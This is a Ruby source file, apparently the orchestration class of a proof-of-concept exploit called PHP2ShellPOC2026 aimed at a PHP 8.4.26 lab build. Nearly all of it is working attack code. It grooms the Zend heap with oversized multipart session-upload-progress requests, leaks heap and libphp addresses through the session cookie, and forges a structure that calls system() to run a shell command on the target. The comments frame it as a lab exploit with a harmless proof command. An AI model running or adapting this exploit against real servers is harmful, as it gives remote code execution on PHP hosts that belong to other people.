# frozen_string_literal: true

require_relative "../i18n"
require_relative "carrier"
require_relative "cookie_memory"
require_relative "multipart_body"
require_relative "offset_table"
require_relative "proof"
require_relative "transport"

module PHP2ShellPOC2026
  module Poc
    # Orchestrates the three observable phases of the lab exploit:
    #
    #   1. derive the Zend heap anchor from the session cookie
    #   2. derive the libphp mapping base from a crafted array layout
    #   3. place the forged carrier and execute the proof command
    #
    # The phase boundaries, field counts, sleeps, retries and worker
    # rotations are part of the exploit protocol; changing them changes the
    # heap layout the payload depends on.
    class Runner
      HEAP_FIELD_COUNT = 841
      ARRAY_INDEX = 406
      ARRAY_WIDTH = 16
      PADDING_SPECS = ([[31, 31]] * 6).freeze
      HUGE_MB = 12
      RETRIES = 3
      COMMAND = "id>/out/p1"
      PROOF_PATH = "out/p1"
      TIMEOUT = 30.0
      SESSION_ID = "attacksessionid0001".b

      def initialize(target, options: nil, out: $stdout, transport: nil, console: nil)
        @target = target
        @options = options || Options.new
        @out = out
        @journal = []
        @attempts = { heap: 0, library: 0, command: 0 }
        @console = console || Console.new(options: @options, out: out)
        @transport = transport || Transport.new(
          target,
          verify_tls: @options.verify_tls,
          ca_file: @options.ca_file,
          timeout: TIMEOUT
        )

        offsets = OffsetTable.load
        @system_function_offset = offsets[:system_function] || SYSTEM_FUNCTION_OFFSET
        @destructor_offset = offsets[:destructor] || DESTRUCTOR_OFFSET
        @carrier_offset = offsets[:carrier] || BOOKWORM_CARRIER_OFFSET
        @proof_path = File.expand_path(PROOF_PATH, Dir.pwd)
      end

      def call
        I18n.with_locale(@options.locale) { perform }
      end

      private

      def perform
        validate_options!
        started = monotonic
        @console.title(t("runner.title", "PENETRATION TEST"))
        note t("runner.target", "Target: %{target}", target: @target.display)
        note t("runner.profile", "Profile: bookworm PHP 8.4.26 lab build")
        note t("runner.proof_command",
               "Proof command: %{command} (the target writes /out/p1; the lab shares it as ./out/p1)",
               command: COMMAND)
        if OffsetTable.load.empty?
          note t("runner.offsets_missing", "No offsets file found; using the bookworm defaults.")
        else
          note t("runner.offsets_loaded", "Offsets loaded from %{path}.",
                 path: File.expand_path("out/offsets.env", Dir.pwd))
        end
        technical t("runner.offsets_technical",
                    "Offsets: system=0x%{system} destructor=0x%{destructor} carrier=0x%{carrier}",
                    system: @system_function_offset.to_s(16),
                    destructor: @destructor_offset.to_s(16),
                    carrier: @carrier_offset.to_s(16))
        note t("runner.large_requests", "The POC sends large multipart requests and can take several minutes.")

        rotate_worker(t("runner.worker_prepare", "Preparing a clean PHP worker"))
        heap_anchor = 0
        @console.step(1, 3, t("runner.heap_step", "Heap layout"),
                      detail: t("runner.heap_detail",
                                "Measuring the Zend heap from the session cookie."))
        (1..RETRIES).each do |attempt|
          @attempts[:heap] = attempt
          @console.action(t("runner.heap_attempt", "Heap attempt %{attempt}/%{total}.",
                            attempt: attempt, total: RETRIES))
          heap_anchor = discover_heap_anchor
          if heap_anchor.positive?
            success t("runner.heap_success", "Heap anchor recovered.")
            technical t("runner.heap_technical", "Heap anchor: 0x%{anchor}",
                        anchor: heap_anchor.to_s(16))
            break
          end
          failure_line t("runner.heap_failure", "The heap leak did not return a usable anchor.")
          rotate_worker(t("runner.recycle_heap", "Recycling before the next heap attempt"))
        end
        return failure(started, "HEAP_LEAK_FAILED") unless heap_anchor.positive?

        rotate_worker(t("runner.worker_library", "Preparing a fresh worker for the library leak"))
        library_anchor = 0
        @console.step(2, 3, t("runner.library_step", "Library base"),
                      detail: t("runner.library_detail",
                                "Locating the libphp mapping from the destructor pointer."))
        (1..RETRIES).each do |attempt|
          @attempts[:library] = attempt
          @console.action(t("runner.library_attempt", "Library attempt %{attempt}/%{total}.",
                            attempt: attempt, total: RETRIES))
          library_anchor = discover_library_anchor
          if library_anchor.positive?
            success t("runner.library_success", "Library base recovered.")
            technical t("runner.library_technical", "Library base: 0x%{anchor}",
                        anchor: library_anchor.to_s(16))
            break
          end
          failure_line t("runner.library_failure", "The library leak did not return a usable base.")
          rotate_worker(t("runner.recycle_library", "Recycling before the next library attempt"))
        end
        return failure(started, "LIBPHP_LEAK_FAILED") unless library_anchor.positive?

        rotate_worker(t("runner.worker_command", "Preparing a fresh worker for the command"))
        carrier_address = heap_anchor + @carrier_offset
        system_function = library_anchor + @system_function_offset
        technical t("runner.carrier_technical",
                    "Carrier address=0x%{carrier} system function=0x%{system}",
                    carrier: carrier_address.to_s(16), system: system_function.to_s(16))
        remove_file(@proof_path)

        @console.step(3, 3, t("runner.command_step", "Command delivery"),
                      detail: t("runner.command_detail",
                                "Placing the forged structures and waiting for the proof file."))
        (1..(RETRIES + 2)).each do |attempt|
          @attempts[:command] = attempt
          @console.action(t("runner.command_attempt", "Command attempt %{attempt}/%{total}.",
                            attempt: attempt, total: RETRIES + 2))
          begin
            deliver_command(carrier_address, system_function)
          rescue StandardError => e
            failure_line t("runner.request_failed", "The request failed: %{error}",
                           error: "#{e.class}: #{e.message}")
          end
          note t("runner.waiting_proof", "Waiting for the proof file...")
          sleep 0.8

          proof = Proof.read(@proof_path)
          unless proof.empty?
            success t("runner.proof_success", "Proof observed on attempt %{attempt}.", attempt: attempt)
            note t("runner.proof", "Proof: %{proof}", proof: Sanitize.terminal(proof))
            return Result.new(
              status: :confirmed, proof: proof,
              duration_ms: elapsed_ms(started), attempts: @attempts,
              heap_anchor: heap_anchor, library_anchor: library_anchor,
              carrier_address: carrier_address, system_function: system_function,
              error: nil, log: @journal
            )
          end
          failure_line t("runner.no_proof", "No proof on attempt %{attempt}.", attempt: attempt)
          rotate_worker(t("runner.recycle_command", "Recycling before the next command attempt"))
        end

        failure(started, "EXPLOIT_FAILED",
                heap_anchor: heap_anchor, library_anchor: library_anchor,
                carrier_address: carrier_address, system_function: system_function)
      rescue ConfigurationError
        raise
      rescue Error => e
        failure(started, e.message)
      rescue StandardError => e
        failure(started, "#{e.class}: #{e.message}")
      end

      private

      def validate_options!
        if @options.proxy
          raise ConfigurationError, t("error.proxy",
                                      "the POC uses a direct socket; unset --proxy before running it")
        end
        if @options.basic_auth || @options.bearer || @options.cookie
          raise ConfigurationError, t("error.credentials",
                                      "the POC does not forward credentials; unset --basic-auth, --bearer or --cookie")
        end
      end

      def rotate_worker(reason = t("runner.worker_default", "Recycling the PHP worker"))
        fields = (0...1001).map { |index| field(format("f%04d", index)[0, 5], "V" * 3000) }
        fields.concat(session_fields(session: "\x00".b, progress: "pwn"))
        fields << file_field
        fields << big_field
        post(fields, "S" * 17, read_limit: 1 << 20, timeout: [90.0, TIMEOUT].max,
                                           label: t("runner.reset_request",
                                                    "%{reason}: sending the reset request (about %{size} MB)",
                                                    reason: reason, size: HUGE_MB))
        sleep 0.3

        fields = session_fields(session: SESSION_ID, progress: "pwn")
        post(fields, "BNDRY12345", read_limit: 65_536, timeout: 20.0,
                                   label: t("runner.session_warmup",
                                            "Sending the session warm-up request"))
        sleep 0.5
      end

      def discover_heap_anchor
        fields = (0...1001).map { |index| field(format("p%04d", index), "x") }
        fields.concat(session_fields(session: "\x00".b, progress: "pwn"))
        fields << file_field
        fields << big_field
        post(fields, "S" * 17, read_limit: 1 << 20, timeout: [90.0, TIMEOUT].max,
                                           label: t("runner.heap_warmup",
                                                    "Sending the heap-shaping warm-up (about %{size} MB)",
                                                    size: HUGE_MB))
        sleep 0.2

        fields = session_fields(session: SESSION_ID, progress: "pwn")
        HEAP_FIELD_COUNT.times do |index|
          value = (format("v%04d", index) + ("x" * 44))[0, 48]
          fields << field((1000 + index).to_s, value)
        end
        forge = ("A" * 79).b
        forge[0x10, 8] = [0x1000].pack("Q<")
        forge[0x18] = "L"
        fields << field("1999", forge)

        response = post(fields, "B" * 10, read_limit: 9 << 20,
                                             label: t("runner.heap_leak",
                                                      "Sending the heap-leak request"))
        CookieMemory.heap_anchor(CookieMemory.session_id(response))
      end

      def discover_library_anchor
        fields = (0...1001).map do |index|
          field(format("f%04d", index)[0, 5], "x" * 39)
        end
        fields.concat(session_fields(session: "\x00".b, progress: "pwn"))
        fields << file_field
        fields << big_field
        post(fields, "S" * 17, read_limit: 1 << 20, timeout: [90.0, TIMEOUT].max,
                                           label: t("runner.library_warmup",
                                                    "Sending the library-shaping warm-up (about %{size} MB)",
                                                    size: HUGE_MB))
        sleep 0.2

        fields = session_fields(session: SESSION_ID, progress: "pwn")
        983.times do |index|
          count = index == ARRAY_INDEX ? ARRAY_WIDTH : 1
          count.times do |position|
            fields << field(format("a%04d[%d]", index, position), "x" * ARRAY_WIDTH)
          end
        end

        response = post(fields, "B" * 10, read_limit: 1 << 20,
                                             label: t("runner.library_leak",
                                                      "Sending the library-leak request"))
        raw = CookieMemory.session_id(response)
        CookieMemory.library_anchor(raw, @destructor_offset)
      end

      def deliver_command(carrier_address, system_function)
        fields = session_fields(session: "a" * 19, progress: "p" * 3)
        PADDING_SPECS.each_with_index do |(name_length, value_length), index|
          name = if name_length.positive?
                   format("p%0#{name_length - 1}d", index)[0, name_length]
                 else
                   ""
                 end
          fields << field(name, "V" * value_length)
        end
        fields << file_field
        fields << big_field
        extra_headers = { "Cookie" => "PHPSESSID=#{'a' * 32}" }
        post(fields, "S" * 17, read_limit: 1 << 20,
                                 timeout: [90.0, TIMEOUT].max,
                                 headers: extra_headers,
                                 label: t("runner.command_warmup",
                                          "Sending the command warm-up (about %{size} MB)",
                                          size: HUGE_MB))
        sleep 0.3

        table, reference = Carrier.build(carrier_address, system_function, COMMAND)
        fields = session_fields(session: SESSION_ID, progress: "pwn")
        carrier = [1, 0x1A].pack("VV") + [carrier_address].pack("Q<")[0, 7]
        2.times { |index| fields << field(format("f%02d", index), "F" * 15) }
        fields << field("g00", carrier)
        15.times do |index|
          fields << field(format("a%030d", index)[0, 31], table)
        end
        post(fields, "B" * 10, read_limit: 65_536, timeout: 30.0,
                                 label: t("runner.command_send",
                                          "Sending the forged carrier and proof command"))
      end

      def session_fields(session:, progress:)
        [
          field("PHPSESSID", session),
          field("PHP_SESSION_UPLOAD_PROGRESS", progress)
        ]
      end

      def file_field
        field("f", "A" * 64, filename: "a.txt")
      end

      def big_field
        field("big", "B" * (HUGE_MB * 1024 * 1024))
      end

      def field(name, data, filename: nil)
        MultipartBody.field(name, data, filename: filename)
      end

      def post(fields, boundary, read_limit:, timeout: nil, headers: {}, label: nil)
        @console.action(label) if label
        started = monotonic
        body = MultipartBody.build(fields, boundary)
        response = @transport.post(body, boundary, read_limit: read_limit,
                                                     timeout: timeout, headers: headers)
        if label
          @console.response(t("runner.response_received",
                              "Response received in %{seconds} s.",
                              seconds: format("%.1f", monotonic - started)))
        end
        response
      end

      def failure(started, error, heap_anchor: 0, library_anchor: 0,
                  carrier_address: 0, system_function: 0)
        failure_line t("runner.failure", "POC failed: %{error}",
                       error: Poc.failure_text(error))
        Result.new(
          status: :failed, proof: "", duration_ms: elapsed_ms(started),
          attempts: @attempts, heap_anchor: heap_anchor,
          library_anchor: library_anchor, carrier_address: carrier_address,
          system_function: system_function, error: error, log: @journal
        )
      end

      def note(text)
        record(text)
        @console.info(text)
      end

      def success(text)
        record(text)
        @console.success(text)
      end

      def failure_line(text)
        record(text)
        @console.failure(text)
      end

      def technical(text)
        record(text) if @options.verbose
        @console.technical(text)
      end

      def record(text)
        @journal << Sanitize.terminal(text)
      end

      def t(key, default, **vars)
        Poc.t(key, default, **vars)
      end

      def remove_file(path)
        File.unlink(path) if File.file?(path)
      rescue SystemCallError
        nil
      end

      def elapsed_ms(started)
        ((monotonic - started) * 1000.0).round(1)
      end

      def monotonic
        Process.clock_gettime(Process::CLOCK_MONOTONIC)
      end
    end
  end
end
